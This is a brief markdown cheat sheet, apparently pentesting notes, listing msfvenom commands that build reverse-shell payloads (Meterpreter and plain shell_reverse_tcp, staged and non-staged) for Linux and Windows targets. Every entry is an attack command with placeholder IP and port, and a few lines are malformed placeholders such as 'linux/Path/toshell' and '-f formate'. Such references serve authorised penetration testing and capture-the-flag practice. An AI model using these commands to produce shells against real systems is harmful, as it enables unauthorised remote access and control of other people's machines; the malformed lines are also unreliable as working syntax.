# MsfVenom shell generator

## Linux 

### NON-Staged 
``
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf >reversetcp.elf
``
``
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf >reversetcp.elf
``
``
msfvenom -p linux/Path/toshell LHOST=IP LPORT=4444 -f elf >reversetcp.elf
``
### Staged 
``
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf >reversetcp.elf
``
``
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf >reversetcp.elf
``

## Windows

### NON-Staged
``
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f formate > reversetcp.format
``
### Staged
``
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f formate > reversetcp.format
``
